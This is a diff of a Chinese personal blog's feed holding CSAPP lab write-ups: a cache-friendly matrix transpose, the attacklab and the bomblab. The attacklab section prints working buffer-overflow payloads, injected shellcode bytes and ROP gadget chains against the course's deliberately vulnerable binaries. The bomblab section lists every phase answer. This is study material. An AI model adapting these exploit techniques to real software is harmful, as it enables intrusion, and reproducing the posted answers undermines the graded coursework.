+                    // Then paste it to B(i, j).
+                    // So block1 is at the right place,
+                    // block2 should be transposed.
+                    a = A[k][j];
+                    b = A[k][j + 1];
+                    c = A[k][j + 2];
+                    d = A[k][j + 3];
+                    e = A[k][j + 4];
+                    f = A[k][j + 5];
+                    g = A[k][j + 6];
+                    h = A[k][j + 7];
+                    B[j][k] = a;
+                    B[j + 1][k] = b;
+                    B[j + 2][k] = c;
+                    B[j + 3][k] = d;
+                    B[j + 0][k + 4] = e;
+                    B[j + 1][k + 4] = f;
+                    B[j + 2][k + 4] = g;
+                    B[j + 3][k + 4] = h;
+                }
+
+                for (int k = j; k &lt; j + 4; k++) {
+                    // Store block2, row by row.
+                    a = B[k][i + 4];
+                    b = B[k][i + 5];
+                    c = B[k][i + 6];
+                    d = B[k][i + 7];
+                    // Store block3 in A.
+                    e = A[i + 4][k];
+                    f = A[i + 5][k];
+                    g = A[i + 6][k];
+                    h = A[i + 7][k];
+                    // Copy block3 to the place of block2(transpose block3).
+                    B[k][i + 4] = e;
+                    B[k][i + 5] = f;
+                    B[k][i + 6] = g;
+                    B[k][i + 7] = h;
+                    // Copy block2 to the place of block3(transpose block2).
+                    B[k + 4][i] = a;
+                    B[k + 4][i + 1] = b;
+                    B[k + 4][i + 2] = c;
+                    B[k + 4][i + 3] = d;
+                }
+
+                for (int k = i + 4; k &lt; i + 8; k++) {
+                    // Copy block4.
+                    a = A[k][j + 4];
+                    b = A[k][j + 5];
+                    c = A[k][j + 6];
+                    d = A[k][j + 7];
+                    B[j + 4][k] = a;
+                    B[j + 5][k] = b;
+                    B[j + 6][k] = c;
+                    B[j + 7][k] = d;
+                }
+            }
+        }
+    }
+</code></pre>
+<p>结果如下：</p>
+<figure data-type="image" tabindex="8"><img src="https://meredith2328.github.io/post-images/1717570604287.png" alt="" loading="lazy"></figure>
+<h3 id="61-67">61 * 67</h3>
+<p>尝试对大部分块使用 8 * 8 分块，对边界处的直接转置，</p>
+<pre><code class="language-c">    if (M == 61) {
+        for (int i = 0; i &lt; N; i += 8) {
+            for (int j = 0; j &lt; M; j += 8) {
+                // Solve the boundary. Use 8 * 8 block for most places.
+                if (i + 8 &lt;= N &amp;&amp; j + 8 &lt;= M) {
+                    // copy the A(i, j) block, row by row. Then paste it to B(j, i).
+                    for (int k = i; k &lt; i + 8; k++) {
+                        a = A[k][j];
+                        b = A[k][j + 1];
+                        c = A[k][j + 2];
+                        d = A[k][j + 3];
+                        e = A[k][j + 4];
+                        f = A[k][j + 5];
+                        g = A[k][j + 6];
+                        h = A[k][j + 7];
+                        B[j][k] = a;
+                        B[j + 1][k] = b;
+                        B[j + 2][k] = c;
+                        B[j + 3][k] = d;
+                        B[j + 4][k] = e;
+                        B[j + 5][k] = f;
+                        B[j + 6][k] = g;
+                        B[j + 7][k] = h;
+                    }
+                }
+                else {
+                    // For the boundary, transpose directly.
+                    // k &lt; min(i + 8, N), s &lt; min(j + 8, M)
+                    for (int k = i; k &lt; (((i + 8) &lt; N) ? (i + 8) : N); k++) {
+                        for (int l = j; l &lt; (((j + 8) &lt; M) ? (j + 8) : M); l++) {
+                            B[l][k] = A[k][l];
+                        }
+                    }
+                    
+                }
+
+            }
+        }
+    }
+</code></pre>
+<p>结果如下：</p>
+<figure data-type="image" tabindex="9"><img src="https://meredith2328.github.io/post-images/1717570592488.png" alt="" loading="lazy"></figure>
+<p>正好不在2000以下。</p>
+<p>思考我们的分块之后，决定把长边设置为循环变量，重新测试：</p>
+<pre><code class="language-c">    if (M == 61) {
+        for (int i = 0; i &lt; N; i += 8) {
+            for (int j = 0; j &lt; M; j += 8) {
+                // Solve the boundary. Use 8 * 8 block for most places.
+                if (i + 8 &lt;= N &amp;&amp; j + 8 &lt;= M) {
+                    // copy the A(i, j) block, row by row. Then paste it to B(j, i).
+                    for (int k = j; k &lt; j + 8; k++) {
+                        a = A[i][k];
+                        b = A[i + 1][k];
+                        c = A[i + 2][k];
+                        d = A[i + 3][k];
+                        e = A[i + 4][k];
+                        f = A[i + 5][k];
+                        g = A[i + 6][k];
+                        h = A[i + 7][k];
+                        B[k][i] = a;
+                        B[k][i + 1] = b;
+                        B[k][i + 2] = c;
+                        B[k][i + 3] = d;
+                        B[k][i + 4] = e;
+                        B[k][i + 5] = f;
+                        B[k][i + 6] = g;
+                        B[k][i + 7] = h;
+                    }
+                }
+                else {
+                    // For the boundary, transpose directly.
+                    // k &lt; min(i + 8, N), s &lt; min(j + 8, M)
+                    for (int k = i; k &lt; (((i + 8) &lt; N) ? (i + 8) : N); k++) {
+                        for (int l = j; l &lt; (((j + 8) &lt; M) ? (j + 8) : M); l++) {
+                            B[l][k] = A[k][l];
+                        }
+                    }
+                    
+                }
+
+            }
+        }
+    }
+</code></pre>
+<p>结果如下：</p>
+<figure data-type="image" tabindex="10"><img src="https://meredith2328.github.io/post-images/1717570567470.png" alt="" loading="lazy"></figure>
+<p>成功通过。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: attacklab]]></title>
+        <id>https://meredith2328.github.io/post/csapp-attacklab/</id>
+        <link href="https://meredith2328.github.io/post/csapp-attacklab/">
+        </link>
+        <updated>2024-05-15T14:29:44.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>前言：注意这个lab不一定能用WSL做，可能会报毫无道理的段错误（Segmentation Fault）。因为学校服务器拿 Ubuntu 16.04 生成。改到 VMWare 跑 Ubuntu 20.04 是可行的。</p>
+</blockquote>
+<h2 id="结果图">结果图</h2>
+<figure data-type="image" tabindex="1"><img src="https://meredith2328.github.io/post-images/1715783531349.png" alt="" loading="lazy"></figure>
+<h2 id="相关指令">相关指令</h2>
+<p>这个lab不用打断点方便很多。</p>
+<pre><code>phase1, 2:
+cat phaseX.txt | ./hex2raw | ./ctarget
+
+./hex2raw &lt; phaseX.txt &gt; phaseX-raw.txt
+gdb ctarget
+run &lt; phaseX-raw.txt
+
+phase3, 4, 5:
+cat phaseX.txt | ./hex2raw | ./rtarget
+</code></pre>
+<p>末尾加 -q 是不发送到评测服务器。</p>
+<h2 id="phase5">phase5</h2>
+<p>我们要做的事情类似于phase3，如下：</p>
+<pre><code>0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 b8 00 64 55 	mov    $0x556400b8,%rdi
+   7:	68 92 18 40 00       	pushq  $0x401892
+   c:	c3                   	retq   
+</code></pre>
+<p>此时我们要解决以下问题：</p>
+<ol>
+<li><code>0x556400b8</code> 本来是我们用于存放字符串的位置（执行的命令之后），但是我们现在此位置未知。<br>
+首先类似于phase4，将我们所需注入的代码： <code>mov 字符串地址,%rdi</code> 和执行touch3拆解为：（伪代码）</li>
+</ol>
+<pre><code>`popq %rax` 对应地址
+此处存放所需字符串地址
+`movq %rax,%rdi` 对应地址
+touch3对应地址
+</code></pre>
+<p>那么接下来只要考虑如何获取到存放的字符串地址。分析farm发现：</p>
+<pre><code>0000000000401964 &lt;mid_farm&gt;:
+  401964:	b8 01 00 00 00       	mov    $0x1,%eax
+  401969:	c3                   	ret    
+
+000000000040196a &lt;add_xy&gt;: # this!
+  40196a:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  40196e:	c3                   	ret    
+
+000000000040196f &lt;getval_376&gt;:
+  40196f:	b8 89 c1 08 c9       	mov    $0xc908c189,%eax
+  401974:	c3                   	ret    
+
+0000000000401975 &lt;setval_439&gt;:
+  401975:	c7 07 a9 d6 38 c9    	movl   $0xc938d6a9,(%rdi)
+  40197b:	c3                   	ret    
+
+000000000040197c &lt;addval_311&gt;:
+  40197c:	8d 87 09 ca 84 db    	lea    -0x247b35f7(%rdi),%eax
+  401982:	c3                   	ret    
+
+0000000000401983 &lt;getval_436&gt;:
+  401983:	b8 89 c1 18 c0       	mov    $0xc018c189,%eax
+  401988:	c3                   	ret    
+
+0000000000401989 &lt;addval_353&gt;:
+  401989:	8d 87 89 c1 00 c9    	lea    -0x36ff3e77(%rdi),%eax
+  40198f:	c3                   	ret    
+
+0000000000401990 &lt;addval_366&gt;: # movq %rsp,%rax
+  401990:	8d 87 48 89 e0 c3    	lea    -0x3c1f76b8(%rdi),%eax
+  401996:	c3                   	ret    
+
+0000000000401997 &lt;addval_378&gt;:
+  401997:	8d 87 09 d6 38 d2    	lea    -0x2dc729f7(%rdi),%eax
+  40199d:	c3                   	ret    
+
+000000000040199e &lt;addval_483&gt;:
+  40199e:	8d 87 48 89 e0 c1    	lea    -0x3e1f76b8(%rdi),%eax
+  4019a4:	c3                   	ret    
+
+00000000004019a5 &lt;getval_385&gt;:
+  4019a5:	b8 48 c9 e0 c3       	mov    $0xc3e0c948,%eax
+  4019aa:	c3                   	ret    
+
+00000000004019ab &lt;setval_325&gt;:
+  4019ab:	c7 07 81 ca 84 db    	movl   $0xdb84ca81,(%rdi)
+  4019b1:	c3                   	ret    
+
+00000000004019b2 &lt;setval_102&gt;:
+  4019b2:	c7 07 89 d6 90 c2    	movl   $0xc290d689,(%rdi)
+  4019b8:	c3                   	ret    
+
+00000000004019b9 &lt;setval_321&gt;:
+  4019b9:	c7 07 89 ca 91 90    	movl   $0x9091ca89,(%rdi)
+  4019bf:	c3                   	ret    
+
+00000000004019c0 &lt;setval_449&gt;:
+  4019c0:	c7 07 89 d6 c1 66    	movl   $0x66c1d689,(%rdi)
+  4019c6:	c3                   	ret    
+
+00000000004019c7 &lt;getval_493&gt;:
+  4019c7:	b8 a9 d6 20 db       	mov    $0xdb20d6a9,%eax
+  4019cc:	c3                   	ret    
+
+00000000004019cd &lt;setval_478&gt;:
+  4019cd:	c7 07 48 99 e0 90    	movl   $0x90e09948,(%rdi)
+  4019d3:	c3                   	ret    
+
+00000000004019d4 &lt;getval_180&gt;: # movl %esp,%eax
+  4019d4:	b8 4a 89 e0 c3       	mov    $0xc3e0894a,%eax
+  4019d9:	c3                   	ret    
+
+00000000004019da &lt;addval_109&gt;:
+  4019da:	8d 87 35 89 c1 92    	lea    -0x6d3e76cb(%rdi),%eax
+  4019e0:	c3                   	ret    
+
+00000000004019e1 &lt;setval_374&gt;:
+  4019e1:	c7 07 89 c1 94 c0    	movl   $0xc094c189,(%rdi)
+  4019e7:	c3                   	ret    
+
+00000000004019e8 &lt;setval_181&gt;: # movl %ecx,%edx
+  4019e8:	c7 07 89 ca c3 e2    	movl   $0xe2c3ca89,(%rdi)
+  4019ee:	c3                   	ret    
+
+00000000004019ef &lt;setval_259&gt;:
+  4019ef:	c7 07 89 ca 30 c9    	movl   $0xc930ca89,(%rdi)
+  4019f5:	c3                   	ret    
+
+00000000004019f6 &lt;getval_105&gt;:
+  4019f6:	b8 89 ca 90 c3       	mov    $0xc390ca89,%eax
+  4019fb:	c3                   	ret    
+
+00000000004019fc &lt;addval_494&gt;: # movl %eax,%ecx
+  4019fc:	8d 87 89 c1 20 db    	lea    -0x24df3e77(%rdi),%eax
+  401a02:	c3                   	ret    
+
+0000000000401a03 &lt;setval_137&gt;: # movl %edx,%esi
+  401a03:	c7 07 f2 89 d6 c3    	movl   $0xc3d689f2,(%rdi)
+  401a09:	c3                   	ret    
+
+0000000000401a0a &lt;getval_243&gt;:
+  401a0a:	b8 5b 99 d6 c3       	mov    $0xc3d6995b,%eax
+  401a0f:	c3                   	ret    
+
+0000000000401a10 &lt;getval_335&gt;:
+  401a10:	b8 48 89 e0 90       	mov    $0x90e08948,%eax
+  401a15:	c3                   	ret    
+
+0000000000401a16 &lt;getval_115&gt;: # movl %esp,%eax
+  401a16:	b8 68 89 e0 c3       	mov    $0xc3e08968,%eax
+  401a1b:	c3                   	ret    
+
+0000000000401a1c &lt;addval_158&gt;:
+  401a1c:	8d 87 89 d6 84 c0    	lea    -0x3f7b2977(%rdi),%eax
+  401a22:	c3                   	ret    
+
+0000000000401a23 &lt;getval_457&gt;:
+  401a23:	b8 89 c1 94 c3       	mov    $0xc394c189,%eax
+  401a28:	c3                   	ret    
+
+0000000000401a29 &lt;addval_400&gt;:
+  401a29:	8d 87 89 ca 94 db    	lea    -0x246b3577(%rdi),%eax
+  401a2f:	c3                   	ret    
+
+0000000000401a30 &lt;getval_202&gt;:
+  401a30:	b8 48 89 e0 94       	mov    $0x94e08948,%eax
+  401a35:	c3                   	ret    
+
+0000000000401a36 &lt;addval_293&gt;:
+  401a36:	8d 87 89 c1 c2 18    	lea    0x18c2c189(%rdi),%eax
+  401a3c:	c3                   	ret    
+
+0000000000401a3d &lt;setval_479&gt;:
+  401a3d:	c7 07 89 ca 28 db    	movl   $0xdb28ca89,(%rdi)
+  401a43:	c3                   	ret    
+
+0000000000401a44 &lt;end_farm&gt;:
+  401a44:	b8 01 00 00 00       	mov    $0x1,%eax
+  401a49:	c3                   	ret    
+</code></pre>
+<p>gadget为我们提供了<code>add_xy</code>指令，区别于其他所有指令，可能会完整用到该指令。结合课本 <code>支持变长栈帧</code> 一节中提到的利用 <code>%rbp</code> 构造相对位置，而我们的 <code>%rsp</code> 的地址可以动态获取得到，考虑利用相对位置获取字符串的动态位置。<br>
+那么我们目标就很明晰了：构造 add %rsp, 相对位移量。<br>
+倒推得到我们需要将 <code>%rsp</code> 和 相对位移量 传给 <code>%rdi</code> 和 <code>%rsi</code> （或相反），结合我们挖到的其他指令：</p>
+<pre><code># # start_farm
+# popq %rax
+# movq %rax,%rdi
+# movq %eax,%edi
+# # mid_farm
+# movq %rsp,%rax
+# movl %esp,%eax
+# movl %ecx,%edx
+# movl %eax,%ecx
+# movl %edx,%esi
+# movl %esp,%eax
+# # end_farm
+</code></pre>
+<p>发现可以做到<br>
+<code>%rsp</code> → <code>%rax</code> → <code>%rdi</code><br>
+相对位移量 → <code>%rax</code> → <code>%ecx</code> → <code>%edx</code> → <code>%esi</code><br>
+这两条路径，从而满足我们的全部要求。<br>
+（其中 <code># movl %eax,%ecx</code>是因为我们在直接找完其他指令之后发现需要有一条目标操作数D为<code>%edx</code>或<code>%ecx</code>或<code>%rdx</code>或<code>%rcx</code>，因此搜寻包含 <code>89 c1</code> 或 <code>89 c2</code> 且之后返回的指令。寻找发现这一条返回之前包含<code>nop</code>、但满足我们的要求。）<br>
+构造伪代码指令如下：</p>
+<pre><code>(%rsp指向此处↓)
+地址: `movq %rsp,%rax` (0000000000401992)
+地址: `movq %rax,%rdi` (000000000040194c)
+地址: `popq %rax` (0000000000401933)
+值: 相对位移量(待写完后计算得是72，即0x48，见下)
+地址: `movl %eax,%ecx` (00000000004019fe)
+地址: `movl %ecx,%edx` (00000000004019ea)
+地址: `movl %edx,%esi` (0000000000401a06)
+地址: add_xy (000000000040196a)
+(上述完成构造所需字符串地址)
+地址: `movq %rax,%rdi` (000000000040194c)
+地址: touch3 (0000000000401892)
+值: 所需字符串 (33 36 36 31 61 39 39 34 00)
+</code></pre>
+<p>翻译如下：</p>
+<pre><code>90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+92 19 40 00 00 00 00 00
+**4c** 19 40 00 00 00 00 00
+33 19 40 00 00 00 00 00
+&lt;48&gt; 00 00 00 00 00 00 00
+fe 19 40 00 00 00 00 00
+ea 19 40 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+6a 19 40 00 00 00 00 00
+4c 19 40 00 00 00 00 00
+92 18 40 00 00 00 00 00
+**33** 36 36 31 61 39 39 34 00
+</code></pre>
+<p>此处观察偏移量。<br>
+我们知道<code>%rsp</code>一开始指向<code>movq %rsp,%rax</code>处（对应 <code>92 19 40 00 00 00 00 00</code> ），经过一次 <code>popq</code> 指令+8，左负右正，移动到了 <code>**4c** 19 40 00 00 00 00 00</code> 处，也就是说我们所需的是此处到我们所需字符串的相对偏移量。<br>
+从<code>**4c**</code>处到<code>**33**</code>处为72个字节，从而获得偏移量为+0x48，填入<code>&lt; &gt;</code>位置即可。</p>
+<p><em><strong>恭喜皆传</strong></em>。</p>
+<h2 id="phase4">phase4</h2>
+<p>我们要做的事情类似于phase2，如下：</p>
+<pre><code>movq $0x3661a994,%rdi  # set the register
+pushq 0x401781         # the address of touch2
+ret
+</code></pre>
+<p>但是，phase2中已知栈底在 <code>0x55640088</code> 处、从而可以直接从被替代的返回值处（也就是<code>%rsp</code>指向的位置）执行上述指令。但phase4未知栈底位置、且如此存入栈其他位置的代码无法执行，只能另做他法。<br>
+首先分析 <code>start_farm</code> 到 <code>mid_farm</code> ：</p>
+<pre><code>0000000000401929 &lt;start_farm&gt;:
+  401929:	b8 01 00 00 00       	mov    $0x1,%eax
+  40192e:	c3                   	ret    
+
+000000000040192f &lt;addval_334&gt;: # popq %rax: 0000000000401933
+  40192f:	8d 87 0f 58 58 90    	lea    -0x6fa7a7f1(%rdi),%eax
+  401935:	c3                   	ret    
+
+0000000000401936 &lt;addval_451&gt;:
+  401936:	8d 87 e5 72 58 90    	lea    -0x6fa78d1b(%rdi),%eax
+  40193c:	c3                   	ret    
+
+000000000040193d &lt;getval_471&gt;:
+  40193d:	b8 58 91 c3 43       	mov    $0x43c39158,%eax
+  401942:	c3                   	ret    
+
+0000000000401943 &lt;addval_154&gt;: # movq %eax,%edi
+  401943:	8d 87 4a 89 c7 c3    	lea    -0x3c3876b6(%rdi),%eax
+  401949:	c3                   	ret    
+
+000000000040194a &lt;setval_392&gt;: # movq %rax,%rdi: 000000000040194c
+  40194a:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+  401950:	c3                   	ret    
+
+0000000000401951 &lt;getval_283&gt;:
+  401951:	b8 3b e8 f4 50       	mov    $0x50f4e83b,%eax
+  401956:	c3                   	ret    
+
+0000000000401957 &lt;getval_162&gt;:
+  401957:	b8 68 89 c7 90       	mov    $0x90c78968,%eax
+  40195c:	c3                   	ret    
+
+000000000040195d &lt;setval_490&gt;:
+  40195d:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+  401963:	c3                   	ret    
+
+0000000000401964 &lt;mid_farm&gt;:
+  401964:	b8 01 00 00 00       	mov    $0x1,%eax
+  401969:	c3                   	ret    
+</code></pre>
+<p>注意我们所需“断章取义”的地址开始处与函数入口不同。<br>
+从以上分析的指令寻找，发现 <code>movq $0x3661a994,%rdi</code>  可以拆作两步： <code>popq %rax</code>和 <code>movq %rax,%rdi</code>，其中将<code>$0x3661a994</code> 存在栈指针指向的位置。这样可以做到不知道栈底的位置、但执行相同的操作。<br>
+基于这个思路，我们将所需执行的“断章取义”的代码（也就是&quot;农场&quot;里的那些地址）全部写在被替代的返回值处，包括如下操作：</p>
+<pre><code>90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+(%rsp指向这里，即原来的返回地址开始处，把它改成需要执行的第一个指令 popq %rax 的地址: 0000000000401933)
+33 19 40 00 00 00 00 00
+
+(之后rsp完成返回后上移，正好挪到我们所需传入值 0x3661a994 的位置，执行pop）
+94 a9 61 36 00 00 00 00
+(注意此处pop传入之后移动8个字节，所以注意补全位数)
+
+(执行完pop后恰好移动到下一个指令 movq %rax,%rdi 的地址： 000000000040194c 处）
+4c 19 40 00 00 00 00 00
+
+(同样道理，利用地址执行touch2: 0000000000401781)
+81 17 40 00 00 00 00 00
+</code></pre>
+<p>简单总结，我们通过断章取义完成了第一套指令的拼凑，而实际上这个断章取义的过程也是函数调用的过程。</p>
+<h2 id="phase3">phase3</h2>
+<p>cookie: <code>3661a994</code>，注意到3对应于0x33，a对应于97即0x61（或A对应65），那么这八位的字符表示分别为</p>
+<pre><code>33 36 36 31 61 39 39 34 00
+</code></pre>
+<p>最后的<code>00</code> 是字符串结尾。<br>
+注意此处不是“小端法”，因为字符串理解为一系列字符、每个字符各自为一个值按顺序存放；而我们存放地址等时是对“同一个值”用多个字符，才需要小端。<br>
+我们用类似于上一个phase的方法进行修改：<br>
+下述的<code>0x401892</code> 是touch3的地址，<code>0x55640088</code> 是栈底（输入字符串的位置），我们存放字符串在加48即0x30的位置，它的地址为 <code>0x556400b8</code>。</p>
+<pre><code>0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 b8 00 64 55 	mov    $0x556400b8,%rdi
+   7:	68 92 18 40 00       	pushq  $0x401892
+   c:	c3                   	retq   
+</code></pre>
+<pre><code>48 c7 c7 b8 00 64 55 68 92 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00 00 00 00 33 36 36 31 61 39 39 34 00
+</code></pre>
+<p>有趣的是，如果我们将cookie字符串存放到大片的00处，由于调用touch3会额外有push和sub（add负值等同于sub）等对栈指针的操作（相减类似于向上述的往左覆盖），我们存放的cookie字符串会被覆盖。因此将cookie字符串存放在字符串末尾巧妙地防止了这一点。运气很好没碰到这个难点，直接解决了。</p>
+<h2 id="phase2">phase2</h2>
+<p>我们考虑的思路是分两步：</p>
+<ol>
+<li>修改寄存器的值为我们所需的cookie</li>
+<li>执行touch2<br>
+为了做到这些，我们首先需要更多的空间存放cookie和修改的指令。<br>
+考虑利用程序为该栈帧分配的40个字节。可以将修改值、之后执行的这些指令全部写在栈帧中，而我们前一个phase所做的跳转改为跳转到栈底，执行完上述操作。<br>
+为了执行touch2，我们可以利用类似于call指令的方法，即将“call指令的下一行”压入栈中、之后返回就会将栈中的地址弹出到PC，作为我们下一处执行的地址，从而将控制归还给touch2。<br>
+基于以上思路，写出的汇编代码如下：</li>
+</ol>
+<pre><code>movq $0x3661a994,%rdi  # set the register
+pushq 0x401781         # the address of touch2
+ret
+</code></pre>
+<p>对应于以下汇编代码：</p>
+<pre><code>0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 94 a9 61 36 	mov    $0x3661a994,%rdi
+   7:	68 81 17 40 00       	pushq  $0x401781
+   c:	c3                   	retq   
+</code></pre>
+<p>而为了利用栈帧分配的40字节，我们就需要获取sub 0x28之后栈帧的地址，跳转到这个位置执行上述指令。<br>
+为此，我们选择使用gdb在执行完sub 0x28之后的下一行打断点 <code>b *0x401743</code>，并读取寄存器的值，得到栈底地址 <code>%rsp = 0x55640088</code> 。</p>
+<p>从而我们按照与phase1相同的思路覆盖返回地址即可。最终得到的代码如下：</p>
+<pre><code>48 c7 c7 94 a9 61 36 68 81 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 64 55 00
+</code></pre>
+<h2 id="phase1">phase1</h2>
+<p><code>touch1</code> 的入口地址是 <code>0x401755</code>，<br>
+考虑到<code>getbuf</code> 先在返回地址处往栈顶分配0x28=40字节的空间，输入值超过40字节即可冲掉返回地址（8字节），使“返回”变为执行我们的指令。所以考虑输入以下内容：</p>
+<pre><code>90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+55 17 40 00 00 00 00 00
+</code></pre>
+<p>其中90代表<code>nop</code>，但其实写别的也没关系，因为这40个字节用不到。</p>
+<p>之后执行以下指令：</p>
+<pre><code>cat phase1.txt | ./hex2raw | ./ctarget -q
+</code></pre>
+<p>即可。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[友情链接们]]></title>
+        <id>https://meredith2328.github.io/post/you-qing-lian-jie-men/</id>
+        <link href="https://meredith2328.github.io/post/you-qing-lian-jie-men/">
+        </link>
+        <updated>2024-04-30T03:25:25.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>仅包含个人有印象的链接。</p>
+</blockquote>
+<h2 id="blogs">Blogs</h2>
+<p><a href="http://tlp.fenesisu.moe/" title="这是TLP's Blog，已征得大蛇老师的同意，好耶(o´ω`o)و">TLP's Blog</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: bomblab]]></title>
+        <id>https://meredith2328.github.io/post/csapp-bomblab/</id>
+        <link href="https://meredith2328.github.io/post/csapp-bomblab/">
+        </link>
+        <updated>2024-04-30T03:09:39.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>最近真没写什么其他好玩的东西，所以拿课堂作业报告水一水Blog。<br>
+因为写这个的时间很有限，可能不像datalab那样精致，是边做边记的，逻辑有点混乱，也有不少错误。</p>
+</blockquote>
+<h2 id="效果截图">效果截图</h2>
+<figure data-type="image" tabindex="1"><img src="https://meredith2328.github.io/post-images/1714446702306.png" alt="" loading="lazy"></figure>
+<p>各phase答案:</p>
+<pre><code>sudo hostnamectl set-hostname ubuntu
+
+Brownie, you are doing a heck of a job.
+0 1 1 2 3 5
+0 u 81
+5 15 DrEvil
+5&gt;:?70
+5 1 2 3 6 4
+50
+</code></pre>
+<h2 id="secret_phase-二叉树搜索">secret_phase: 二叉树搜索</h2>
+<p>读入整数，整数，字符串<br>
+<code>b secret_phase</code><br>
+edx: a<br>
+esi: 0<br>
+rdi: &amp;input_str<br>
+rbx: rax=int(input_str)=input_int<br>
+rax: input_int - 1<br>
+u&lt;=3e8, so 1 ≤ input_int ≤ 3e9<br>
+esi: input_int<br>
+<code>x/512x 0x604110</code></p>
+<p><img src="https://meredith2328.github.io/post-images/1714446733981.png" alt="" loading="lazy"><br>
+<img src="https://meredith2328.github.io/post-images/1714446738318.png" alt="" loading="lazy"><br>
+<img src="https://meredith2328.github.io/post-images/1714446742148.png" alt="" loading="lazy"></p>
+<p>24<br>
+8    <strong>32 (50)</strong><br>
+6  16  2d  6b<br>
+1 7  14 23  28 2f(47)  63 3e9(1001)</p>
+<p>要求fun7的返回值为1<br>
+<strong>fun7</strong><br>
+参数1: edi=edx，开始时是树的根节点<br>
+参数2: esi，input_int</p>
+<p>if (input_int &gt;= 根节点的值):<br>
++28<br>
+eax = 0<br>
+edx = input_int时直接跳出返回<br>
+否则参数1: edi根节点变右节点，嵌套一层，但注意这里是<strong>call</strong>而不是jump，意味着过去完还要回来的，而且保存返回值<br>
+走右边: 返回值翻倍再加一<br>
+&lt; :<br>
++15<br>
+去左节点: 返回值翻倍</p>
+<p>但注意上述返回值的变化是从叶到根生效，是倒序的<br>
+所以大于就往右走，小于就往左走<br>
+既然返回值为1，而返回值初始为0，往右走一步就跳出就可以，意味着被调用函数返回值为0，之后向右执行一步得到1，返回即可。<br>
+注意读到的0x32等于<code>50</code>。</p>
+<h2 id="phase_6-链表排序">phase_6: 链表排序</h2>
+<p>读入六个整数<br>
+rsi: %rsp，其实是&amp;num1</p>
+<p>循环1开头:<br>
+r12: &amp;num1<br>
+r13d: 0<br>
+rbp: &amp;num1<br>
+eax: num1 - 1 unsigned &lt;= 5<br>
+要求num1 - 1 &gt;= 0，1 &lt;= num1 ≤ 6<br>
+r13d: 1<br>
+执行满六次之后跳+134</p>
+<p>循环2:<br>
++73到+98<br>
+ebx: 1<br>
+eax: num2<br>
+要求num1 != num2<br>
+ebx++，小于等于5时继续循环这一块，如上执行五次，<br>
+要求num1 != num2, num2 != num3, num3 != num4, num4 != num5, num5 != num6</p>
+<p>循环1结尾:<br>
++100<br>
+r12: &amp;num1→&amp;num2<br>
+所以意味着以上类似要求执行了6次，<br>
+即要求 1 &lt;= num1, ..., num6 ＜= 6<br>
+之后跳134</p>
+<p>+134<br>
+esi = 0<br>
++139开始是第三循环体<br>
+ecx = num1<br>
+eax = 1<br>
+edx = node1<br>
+if (num1＞1):<br>
+goto 106<br>
+else (num1 == 1):<br>
+goto 117</p>
+<figure data-type="image" tabindex="2"><img src="https://meredith2328.github.io/post-images/1714446756176.png" alt="" loading="lazy"></figure>
+<p>+117<br>
+rsp+20 = node1<br>
+再执行5次，也就是挑好了合适的，numx的值为y则对应nodey</p>
+<p>+159跳出第三循环体，进入第四循环（其实还有第五循环套在这一层外面）<br>
+rbx=node1，不是-&gt;val</p>
+<p>第四循环<br>
+rax=node1<br>
+rsi=node6<br>
+rcx=node1-&gt;val?还是node1? node1吧<br>
+循环体：+177<br>
+rdx=node2<br>
+node1-&gt;next=node2?<br>
+rax=node2<br>
+rcx=node2<br>
+总之第四循环就是把node1到6按顺序连起来<br>
+吧</p>
+<p>+197跳出第四循环，回到第五循环<br>
+node6-&gt;next = null<br>
+ebp=5<br>
+rax=node2-&gt;val<br>
+要求node1-&gt;val &gt; node2-&gt;val<br>
+rbx变node2，ebp--，循环五次意味着节点值从node1到node6递减<br>
+因此只要找合适的num值使前述节点排列成递减即可，即值顺序为 <code>5 1 2 3 6 4</code>。</p>
+<p>综上，这次phase没有a[i] = 7 - a[i]，应该相对还行。</p>
+<h2 id="phase_5">phase_5</h2>
+<h3 id="版本1-数组对应">版本1: 数组对应</h3>
+<p>输入字符串长度为6<br>
+%rax: &amp;字符串，之后右移，属于循环变量<br>
+%rbx: &amp;字符串<br>
+%rdi: 字符串结尾，属于循环条件<br>
+%ecx: 0<br>
+%edx: 第一个字符与0xf，即取低四位作为数组下标，对应出另一个整数，加到%ecx中<br>
+观察<code>x/16 0x402780</code>得到如下关系：</p>
+<figure data-type="image" tabindex="3"><img src="https://meredith2328.github.io/post-images/1714446769510.png" alt="" loading="lazy"></figure>
+<p>在跳回之前我们观察结束条件，%ecx=0x3f=63，也就是六个字符的下标对应出的数字之和为63.<br>
+可取16+15+14+13+3+2，即下标为5, 14, 10, 15, 7, 0, 比如可以取48+这些数：<code>5&gt;:?70</code><br>
+注意不能用32+这些数，因为空格会在类scanf的函数中读值时自动被忽略掉。</p>
+<h3 id="版本2-数组跳转">版本2: 数组跳转</h3>
+<table>
+<thead>
+<tr>
+<th>数组下标</th>
+<th>值</th>
+<th></th>
+<th>数组下标</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>a</td>
+<td></td>
